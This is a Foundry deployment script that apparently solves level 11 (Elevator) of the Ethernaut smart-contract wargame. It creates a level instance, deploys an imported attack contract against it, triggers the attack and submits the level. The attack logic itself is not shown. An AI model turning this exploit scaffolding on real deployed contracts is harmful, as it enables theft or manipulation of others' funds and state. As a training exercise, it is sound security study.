// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Elevator } from "src/Level11.sol";
import { L11Attack } from "src/Level11Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance{ value: 0.001 ether }(0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Elevator instance = Elevator(instanceAddress);

        L11Attack attack = new L11Attack(instance);
        attack.attack{ gas: 1_000_000 }();
        console2.log(instance.top());

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
